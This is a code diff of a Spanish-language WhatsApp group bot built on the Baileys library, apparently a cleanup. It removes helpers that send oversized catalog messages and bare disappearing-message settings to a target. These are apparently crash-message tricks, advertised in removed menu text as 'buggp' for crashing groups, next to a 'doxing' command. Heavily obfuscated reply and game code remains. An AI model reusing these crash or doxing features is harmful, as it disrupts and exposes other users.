@@ -20,7 +20,6 @@ const {
   waChatKey,
   WA_DEFAULT_EPHEMERAL,
   mentionedJid,
-  prepareMessageFromContent, 
   Browsers,
   processTime
 } = require("@adiwajshing/baileys")
@@ -31,6 +30,7 @@ const speed = require('performance-now');
 const chalk = require('chalk');
 const crypto = require("crypto-js");
 const CryptoJS = require("crypto-js");
+const request = require('request');
 const fs = require('fs');
 const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
 const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
@@ -40,15 +40,12 @@ const { exec } = require('child_process');
 const ffmpeg = require('fluent-ffmpeg');
 const axios = require('axios');
 const fetch = require('node-fetch');
-const request = require('request');
 const fromBuffer = require('file-type');
 const FormData = require('form-data')
 const samuGg = require('google-it');
 const samuGgImg = require('g-i-s');
-const hx = require('hxz-api');
 ////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
 const { validmove, setGame } = require("./lib/tictactoe");
-const simple = require('./lib/simple.js');
 const {y2mateA, y2mateV} = require('./lib/y2mate.js')
 const {sm330mfire} = require('./lib/mediafire.js')
 const { ssstik } = require("./lib/tiktok.js")
@@ -59,7 +56,6 @@ const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
 const crypt = fs.readFileSync('./crypt/imp.json')
 const zalgo = require('./lib/zalgo')
 const {convertSticker} = require("./lib/swm.js")
-const { samuBug } = require('./crypt/samuBug')
 const conn = require("./lib/connect")
 const msg = require("./lib/message")
 const wa = require("./lib/wa")
@@ -77,7 +73,6 @@ const samu = JSON.parse(fs.readFileSync('./setting.json'))
 const bodyM = samu.samuM
 const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
 const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
-const antibot = JSON.parse(fs.readFileSync('./src/antibot.json'))
 const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
 const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
 const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
@@ -362,8 +357,6 @@ samu330.on('chat-update', async(sam) => {
         hit_today.push(command)
 	const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
 	const samu = '```'
-    m = simple.smsg(samu330, sam)
-	const otherBot = m.isBaileys
 	const crypto = require('crypto')
         const args = body.trim().split(/ +/).slice(1)
         const isCmd = body.startsWith(prefix)
@@ -384,7 +377,6 @@ samu330.on('chat-update', async(sam) => {
 	const isAntigp = isGroup ? antigp.includes(from) : false
 	const isAntiMedia = isGroup ? antimedia.includes(from) : false
 	const isAntiFake = isGroup ? antifake.includes(from) : false
-    const isAntiBot = isGroup ? antibot.includes(from) : false
 	const isAutoSt = isGroup ? autostick.includes(from) : false
 	const isNsfw = isGroup ? nsfw.includes(from) : false
 	const isSimi = isGroup ? simi.includes(from): false
@@ -426,11 +418,6 @@ samu330.on('chat-update', async(sam) => {
 	const sendMess = (hehe, teks) => {
 	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
   	}
-
-    const katalog = (teks) => {
-        res = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/ara.png'), "surface": 'CATALOG' }}, {quoted:sam})
-        samu330.relayWAMessage(res)
-   }
 	
 	mess = {
 			wait: '⌛ 𝐄𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐎 ⌛',
@@ -517,30 +504,6 @@ samu330.on('chat-update', async(sam) => {
         if (!mods.includes(senderNumber)) return
         mods.slice(mods.indexOf(owner), 1)
         }
-
-
-
-
-        if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
-        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
-	
-	    	if (isBan && isCmd && !isOwner) {
-		reply('*Lo siento pero usted es un usuario baneado, no puede hacer uso del bot!*')
-        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
-        	}
-	
-		if (isCmd && isFiltered(from) && !isGroup) {
-        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
-        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
-		}
-        
-        	if (isCmd && isFiltered(from) && isGroup) {
-        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
-        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
-		}
-
-
-
 	    
 	const sendFile = async (archivo, nombreDeArchivo, comentario, tag, vn) => {
   	tipo = await getBuffer(archivo)
@@ -579,36 +542,6 @@ samu330.on('chat-update', async(sam) => {
 	})
 	})
 	}
-
-    const sendMediaURL = async(to, url, text="", mids=[]) =>{
-        if(mids.length > 0){
-            text = mentions(text, mids, true)
-        }
-        const fn = Date.now() / 10000;
-        const filename = fn.toString()
-        let mime = ""
-        var download = function (uri, filename, callback) {
-            request.head(uri, function (err, res, body) {
-                mime = res.headers['content-type']
-                request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
-            });
-        };
-        download(url, filename, async function () {
-            console.log('');
-            let media = fs.readFileSync(filename)
-            let type = mime.split("/")[0]+"Message"
-            if(mime === "image/gif"){
-                type = MessageType.video
-                mime = Mimetype.gif
-            }
-            if(mime.split("/")[0] === "audio"){
-                mime = Mimetype.mp4Audio
-            }
-            samu330.sendMessage(to, media, type, { quoted: sam, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
-            
-            fs.unlinkSync(filename)
-        });
-    }
 		    
 	const nivelActual = getLevelingLevel(sender)
             var rango = '🎭Principiante'
@@ -674,7 +607,7 @@ samu330.on('chat-update', async(sam) => {
 	}	
 	    
 
-	var _0x7f15=["\x74\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","","\x2E\x2F\x73\x72\x63\x2F\x66\x61\x6B\x65\x2E\x6A\x70\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83C\uDF52\x4E\x79\x61\x6E\x42\x6F\x74\x20\x7C\x20\x53\x61\x6D\x75\x33\x33\x30\uD83E\uDE80","\x5B\x20\u2605\x20\x5D\x20\u5C71\u59C6\x20\x33\x33\x30","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x61\x2E\x6D\x65\x2F\x2B\x35\x32\x39\x39\x38\x34\x39\x30\x37\x37\x39\x34","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x72\x65\x70\x6C\x79\x2E\x70\x6E\x67","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];const reply=async (_0xbc4ax2)=>{samu330[_0x7f15[10]](from,_0xbc4ax2,MessageType[_0x7f15[0]],{sendEphemeral:true,quoted:{key:{fromMe:false,participant:`${_0x7f15[1]}`,...(from?{remoteJid:_0x7f15[2]}:{})},message:{"\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x63\x61\x70\x74\x69\x6F\x6E":`${_0x7f15[3]}${body}${_0x7f15[3]}`,'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0x7f15[5]](_0x7f15[4])}}},contextInfo:{"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":_0x7f15[6],"\x62\x6F\x64\x79":_0x7f15[7],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x7f15[8]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0x7f15[5]](_0x7f15[9])}}})}
+	var _0xad70=["\x74\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x72\x65\x70\x6C\x79\x2E\x70\x6E\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83C\uDF52\x4E\x79\x61\x6E\x42\x6F\x74\x20\x7C\x20\x53\x61\x6D\x75\x33\x33\x30\uD83E\uDE80","\x5B\x20\u2605\x20\x5D\x20\u5C71\u59C6\x20\x33\x33\x30","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x61\x2E\x6D\x65\x2F\x2B\x35\x32\x39\x39\x38\x34\x39\x30\x37\x37\x39\x34","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];const reply=async (_0x80f7x2)=>{samu330[_0xad70[9]](from,_0x80f7x2,MessageType[_0xad70[0]],{sendEphemeral:true,quoted:{key:{fromMe:false,participant:`${_0xad70[1]}`,...(from?{remoteJid:_0xad70[2]}:{})},message:{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":`${_0xad70[3]}${q}${_0xad70[3]}`,'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0xad70[5]](_0xad70[4])}}},contextInfo:{"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":_0xad70[6],"\x62\x6F\x64\x79":_0xad70[7],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0xad70[8]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0xad70[5]](_0xad70[4])}}})}
 	
 	/*const fileIO = async buffer => {
   		const { ext } = await fromBuffer(buffer) || {}
@@ -689,40 +622,6 @@ samu330.on('chat-update', async(sam) => {
   		return jsona.link
 		reply(jsona.link)
 		}*/
-
-
-        const sendBug = async (target) => {
-            await samu330.relayWAMessage(
-              samu330.prepareMessageFromContent(
-                target,
-                samu330.prepareDisappearingMessageSettingContent(0),
-                {}
-              ),{ waitForAck: true }) 
-          }
-
-          const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
-            const buttonMessage = {
-            contentText: text1,
-            footerText: desc1,
-            buttons: but,
-            headerType: 1
-            }
-            samu330.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
-            }
-
-        const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
-                kma = gam1
-                mhan = await samu330.prepareMessage(from, kma, location)
-                const buttonMessages = {
-                locationMessage: mhan.message.locationMessage,
-                contentText: text1,
-                footerText: desc1,
-                buttons: but,
-                headerType: 6
-                }
-                samu330.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-                }
-
 	
 	const noreg = {
 		key: {
@@ -865,6 +764,24 @@ contextInfo: {
 mentionedJid: [sender]}
 
 
+		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
+        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
+	
+	    	if (isBan && isCmd && !isOwner) {
+		reply('*Lo siento pero usted es un usuario baneado, no puede hacer uso del bot!*')
+        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
+        	}
+	
+		if (isCmd && isFiltered(from) && !isGroup) {
+        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
+        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
+		}
+        
+        	if (isCmd && isFiltered(from) && isGroup) {
+        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
+        	return samu330.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nEspere 3 segundos para poder usar otros comandos, gracias✅`, MessageType.text, {quoted: fspam})
+		}
+
 
 		/*--------------------[ Tictactoe Game Function ]--------------------*/
 function _0xd037(_0x1fea26,_0x25290c){const _0x49fad6=_0x33d3();return _0xd037=function(_0x4c8951,_0x3b65b8){_0x4c8951=_0x4c8951-0x16e;let _0x299f50=_0x49fad6[_0x4c8951];return _0x299f50;},_0xd037(_0x1fea26,_0x25290c);}const _0x5cde97=_0xd037;(function(_0x21fbf1,_0x38d5a9){const _0x3f2272=_0xd037,_0x1107c4=_0x21fbf1();while(!![]){try{const _0x4fd9b6=-parseInt(_0x3f2272(0x192))/0x1+parseInt(_0x3f2272(0x183))/0x2*(parseInt(_0x3f2272(0x17a))/0x3)+parseInt(_0x3f2272(0x173))/0x4+-parseInt(_0x3f2272(0x1a4))/0x5*(-parseInt(_0x3f2272(0x190))/0x6)+parseInt(_0x3f2272(0x19a))/0x7+parseInt(_0x3f2272(0x1a7))/0x8*(-parseInt(_0x3f2272(0x188))/0x9)+-parseInt(_0x3f2272(0x178))/0xa;if(_0x4fd9b6===_0x38d5a9)break;else _0x1107c4['push'](_0x1107c4['shift']());}catch(_0x92ee90){_0x1107c4['push'](_0x1107c4['shift']());}}}(_0x33d3,0x43adf));const _0x4318e=function(){let _0x18466e=!![];return function(_0x28f8e7,_0x986b11){const _0x4bc3c5=_0x18466e?function(){if(_0x986b11){const _0x3caa52=_0x986b11['apply'](_0x28f8e7,arguments);return _0x986b11=null,_0x3caa52;}}:function(){};return _0x18466e=![],_0x4bc3c5;};}(),_0x399f56=_0x4318e(this,function(){const _0x275f56=_0xd037;return _0x399f56['toString']()[_0x275f56(0x18c)]('(((.+)+)+)+$')[_0x275f56(0x1a0)]()[_0x275f56(0x18b)](_0x399f56)[_0x275f56(0x18c)](_0x275f56(0x184));});_0x399f56();const _0x3b65b8=function(){let _0x41cd2c=!![];return function(_0x1384a8,_0x35af9f){const _0x2ca771=_0x41cd2c?function(){if(_0x35af9f){const _0x32bda9=_0x35af9f['apply'](_0x1384a8,arguments);return _0x35af9f=null,_0x32bda9;}}:function(){};return _0x41cd2c=![],_0x2ca771;};}(),_0x4c8951=_0x3b65b8(this,function(){const _0x14fcdb=_0xd037;let _0x37198e;try{const _0x26cfb0=Function(_0x14fcdb(0x185)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x37198e=_0x26cfb0();}catch(_0x5c47dd){_0x37198e=window;}const _0x26d7b0=_0x37198e[_0x14fcdb(0x18a)]=_0x37198e['console']||{},_0xcbaed9=['log','warn',_0x14fcdb(0x197),_0x14fcdb(0x19f),_0x14fcdb(0x170),_0x14fcdb(0x17e),_0x14fcdb(0x19e)];for(let _0x31060f=0x0;_0x31060f<_0xcbaed9['length'];_0x31060f++){const _0x5ee4eb=_0x3b65b8[_0x14fcdb(0x18b)][_0x14fcdb(0x194)][_0x14fcdb(0x1a8)](_0x3b65b8),_0x41fe71=_0xcbaed9[_0x31060f],_0x2fcf3e=_0x26d7b0[_0x41fe71]||_0x5ee4eb;_0x5ee4eb[_0x14fcdb(0x16e)]=_0x3b65b8[_0x14fcdb(0x1a8)](_0x3b65b8),_0x5ee4eb[_0x14fcdb(0x1a0)]=_0x2fcf3e[_0x14fcdb(0x1a0)]['bind'](_0x2fcf3e),_0x26d7b0[_0x41fe71]=_0x5ee4eb;}});_0x4c8951();function _0x33d3(){const _0x2f778d=['console','constructor','search','\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a','.json','_matrix','1341258PTQvxw','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20El\x20juego\x20termina\x20en\x20empate\x20😐\x0a','530904zopBPB','text','prototype','\x20│\x20','writeFileSync','info','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@','unlinkSync','2523374cjUElw','\x0a\x0a\x0a\x20\x20\x20','Desafortunadamente\x20el\x20desafío\x20para\x20@','@s.whatsapp.net','trace','error','toString','por\x20qué','replace','\x0a\x20\x20\x20\x20\x20','5KuVOET','isWin','Cex','8BwrXBC','bind','__proto__','split','exception','turn','\x0a\x0a\x20\x20\x20\x20\x20','222244BBUccz','\x0a⭕\x20:\x20@','includes','*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0aEl\x20ganador\x20es\x20@','\x20fue\x20rechazado\x20❌😕','1058900skWhPB','Esta\x20opción\x20es\x20solo\x20para\x20@','1640508cIcQWw','./lib/tictactoe/db/','sendMessage','El\x20juego\x20ha\x20comenzado\x20antes!','table','\x0a\x20\x20\x20','status','random','toLowerCase','2rQjqMR','(((.+)+)+)+$','return\x20(function()\x20','stringify','winner','2451717cMvRYu','floor'];_0x33d3=function(){return _0x2f778d;};return _0x33d3();}const cmde=budy[_0x5cde97(0x182)]()[_0x5cde97(0x16f)]('\x20')[0x0]||'';let arrNum=['1','2','3','4','5','6','7','8','9'];if(fs['existsSync'](_0x5cde97(0x17b)+from+_0x5cde97(0x18e))){const boardnow=setGame(''+from);if(budy==_0x5cde97(0x1a6))return reply(_0x5cde97(0x1a1));if(budy[_0x5cde97(0x182)]()=='y'||budy[_0x5cde97(0x182)]()=='yes'||budy['toLowerCase']()=='s'){if(boardnow['O']==sender[_0x5cde97(0x1a2)]('@s.whatsapp.net','')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));const matrix=boardnow[_0x5cde97(0x18f)];boardnow[_0x5cde97(0x180)]=!![],fs[_0x5cde97(0x196)]('./lib/tictactoe/db/'+from+_0x5cde97(0x18e),JSON[_0x5cde97(0x186)](boardnow,null,0x2));const chatAccept='*🎮\x20Tictactoe\x20Game\x20🎳*\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a❌\x20:\x20@'+boardnow['X']+_0x5cde97(0x174)+boardnow['O']+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aEs\x20el\x20turno\x20de\x20:\x20@'+(boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])+_0x5cde97(0x172)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x1a3)+matrix[0x1][0x0]+_0x5cde97(0x195)+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x1a3)+matrix[0x2][0x0]+'\x20│\x20'+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+_0x5cde97(0x18d);samu330[_0x5cde97(0x17c)](from,chatAccept,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+'@s.whatsapp.net',boardnow['O']+_0x5cde97(0x19d)]}});}else samu330['sendMessage'](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}else{if(budy[_0x5cde97(0x182)]()=='n'||budy[_0x5cde97(0x182)]()=='no'||budy['toLowerCase']()=='nopi'){if(boardnow['O']==sender['replace'](_0x5cde97(0x19d),'')){if(boardnow[_0x5cde97(0x180)])return reply(_0x5cde97(0x17d));fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e)),samu330[_0x5cde97(0x17c)](from,_0x5cde97(0x19c)+boardnow['X']+_0x5cde97(0x177),MessageType['text'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['X']+_0x5cde97(0x19d)]}});}else samu330[_0x5cde97(0x17c)](from,_0x5cde97(0x179)+boardnow['O']+'\x20!',MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[boardnow['O']+_0x5cde97(0x19d)]}});}}}if(arrNum[_0x5cde97(0x175)](cmde)){const boardnow=setGame(''+from);if(!boardnow[_0x5cde97(0x180)])return reply('Parece\x20que\x20tu\x20oponente\x20no\x20ha\x20aceptado\x20el\x20desafío..');if((boardnow[_0x5cde97(0x171)]=='X'?boardnow['X']:boardnow['O'])!=sender[_0x5cde97(0x1a2)](_0x5cde97(0x19d),''))return;const moving=validmove(Number(budy),''+from),matrix=moving[_0x5cde97(0x18f)];if(moving[_0x5cde97(0x1a5)]){if(moving[_0x5cde97(0x187)]=='SERI'){const chatEqual=_0x5cde97(0x191);reply(chatEqual),fs[_0x5cde97(0x199)]('./lib/tictactoe/db/'+from+'.json');return;}const winnerJID=moving[_0x5cde97(0x187)]=='O'?moving['O']:moving['X'],looseJID=moving[_0x5cde97(0x187)]=='O'?moving['X']:moving['O'],limWin=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0x14)+0xa,limLoose=Math[_0x5cde97(0x189)](Math[_0x5cde97(0x181)]()*0xa)+0x5,chatWon=_0x5cde97(0x176)+winnerJID+'\x20😎👑\x0a';samu330['sendMessage'](from,chatWon,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving[_0x5cde97(0x187)]=='O'?moving['O']+_0x5cde97(0x19d):moving['X']+_0x5cde97(0x19d)]}}),fs[_0x5cde97(0x199)](_0x5cde97(0x17b)+from+_0x5cde97(0x18e));}else{const chatMove=_0x5cde97(0x198)+moving['X']+_0x5cde97(0x174)+moving['O']+'\x0a\x0aEs\x20el\x20turno\x20de:\x20@'+(moving[_0x5cde97(0x171)]=='X'?moving['X']:moving['O'])+_0x5cde97(0x19b)+matrix[0x0][0x0]+_0x5cde97(0x195)+matrix[0x0][0x1]+_0x5cde97(0x195)+matrix[0x0][0x2]+_0x5cde97(0x17f)+matrix[0x1][0x0]+'\x20│\x20'+matrix[0x1][0x1]+_0x5cde97(0x195)+matrix[0x1][0x2]+_0x5cde97(0x17f)+matrix[0x2][0x0]+_0x5cde97(0x195)+matrix[0x2][0x1]+_0x5cde97(0x195)+matrix[0x2][0x2]+'\x0a\x0a\x0a\x0a\x0a*⭕Tictactoe\x20by:*\x0a\x0a➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈\x20y\x20Keͥ͢vͣıͫ͘͜𝜂\x0a';samu330[_0x5cde97(0x17c)](from,chatMove,MessageType[_0x5cde97(0x193)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[moving['X']+_0x5cde97(0x19d),moving['O']+_0x5cde97(0x19d)]}});}}
@@ -916,480 +833,6 @@ function _0xd037(_0x1fea26,_0x25290c){const _0x49fad6=_0x33d3();return _0xd037=f
 				}
 			}
 		}
-
-//Menus
-const mda = `
-╔════════════════╗
-╠  ◈  𝙈𝙀𝙉𝙐⁪⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼 ◈  ╣
-╠════════════════╝
-║
-╠ *●${prefix}clima* + region
-║ _El clima_
-║
-╠ *●${prefix}zalgo*
-║ _Texto estilo zalgo_
-║
-╠ *●${prefix}contar*
-║ _Cuenta caracteres de un texto_
-║
-╠ *●${prefix}caras*
-║ _Etiqueta una imagen para detectar caras_
-║
-║
-╠ *●${prefix}quemusicaes*
-║ _Busca el nombre de las canciones que no conozcas_
-║
-╠ *●${prefix}imagen*
-║ _Búsqueda de imágenes_
-║ _en Google_
-║
-╠ *●${prefix}sinfondo*
-║ _Quita fondo a imagenes_
-║
-╠ *●${prefix}wp* 
-║ _Búsqueda de fondos_
-║ _de pantalla_
-║
-╠ *●${prefix}par*
-║ _Anime para compartir perfil_
-║ _(hombre | mujeres)_
-║
-╠ *●${prefix}animevid*
-║ _Videos anime cortos_
-║
-╠ *●${prefix}queanime*
-║ _Etiqueta una imagen de un Anime_
-║ _Para saber que anime es_
-║
-╠ *●${prefix}loli*
-║
-╠ *●${prefix}neko*
-║
-╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
-║
-╠ *●${prefix}bass*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}ardilla*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}trigger*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}lento*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}rapido*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}imut*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}hode*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}grave*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}fantasma*
-║ _Etiqueta un audio_
-║
-╠ *●${prefix}robot*
-║ _Etiqueta un audio_
-║
-╟╼╾┤🎞VIDEOS🎞├╼╾
-║
-╠ *●${prefix}reversa*
-║ _Etiqueta un video_
-║
-╠ *●${prefix}vrapido*
-║ _Etiqueta un video_
-║
-╠ *●${prefix}vlento*
-║ _Etiqueta un video_
-║
-╠ *●${prefix}mirror*
-║ _Etiqueta un video_
-║
-╠ *●${prefix}vefecto*
-║ _Etiqueta un video_
-║
-╠ *●${prefix}sinsonido*
-║ _Etiqueta un video_
-╙╖
-╒╩════════════
-╰──────────────╮
-╭────────–──────┴╮
-│☠️Team SkullForce 500 ☠️
-╰────────–───────╯`
-
-const stc = `╭⸻⃞✫꯭𝙈꯭𝙀꯭𝙉꯭𝙐꯭✫⃞⸻╮
-╰────ြ𝐒𝐭𝐢𝐜𝐤𝐞𝐫🃏
-╭─────────────
-│ *${prefix}sticker*
-│ _Imagen/gif/video_
-│ Para crear sticker con video,
-│ eiqueta el video/gif a
-│ convertir con el comando. 
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}spack*
-│ _Paquete personalizado_
-│Ex: *${prefix}spack* Samu|330
-╰───────────────────╮
-╭───────────────────╯
-│ *${prefix}robar*
-│ *${prefix}exif*
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}takestick*
-│ _Nombre|Autor_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}sp*
-│ _Etiqueta un Mensaje_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}sgay*
-│ _Etiqueta una imagen_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}srip*
-│ _Etiqueta una imagen_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}scarcel*
-│ _Etiqueta una imagen_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}swm*
-│ _Nombre|Autor_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}colores*
-│ _Texto a colores_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}ger*
-│ _Estilo Triggered_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}aimg*
-│ _Stiker a imagen_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}agif*
-│ _Stiker a gif_
-╰─────────────╮
-╭────────–─────┴╮
-│☠️ Team SkullForce 500 ☠️
-╰────────–──────╯`
-const Menug = `☠️ Team SkullForce 500 ☠️                                                                   
-        🔐Hola *${pushname}*
-    
-${bodyM} ${samu}${prefix}antilink${samu}
-${bodyM} ${samu}${prefix}antimedia${samu}
-${bodyM} ${samu}${prefix}antibad${samu}
-${bodyM} ${samu}${prefix}autostick${samu}
-${bodyM} ${samu}${prefix}antileg${samu}
-${bodyM} ${samu}${prefix}welcome${samu}
-    
-${bodyM} ${samu}${prefix}antigp${samu}
-_Para prohibir los links de otros grupos_
-    
-    ================================
-    *🔞PARA ACTIVAR LOS COMANDOS +18*:
-    ================================
-    ${bodyM} ${prefix}+18 1/0
-    ================================
-        _Modo simsimi ilimitado_
-    
-*${prefix}simsimi 1*
-    
-    
-*Para que el bot entre a tu grupo, usa el siguiente comando:*
-${prefix}entrabot *(Link del grupo)*
-        
-🚧 *El siguiente comando es para crashear los grupos!! este comando es muy peligroso :) solo administradores pueden usarlo.* 🚧
-    
-*${prefix}buggp*
-    
-_Usalo bajo tu responsabilidad!_
-    
-    
-${bodyM} ${prefix}doxing _(Etiqueta un participante o algun mensaje)_
-${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
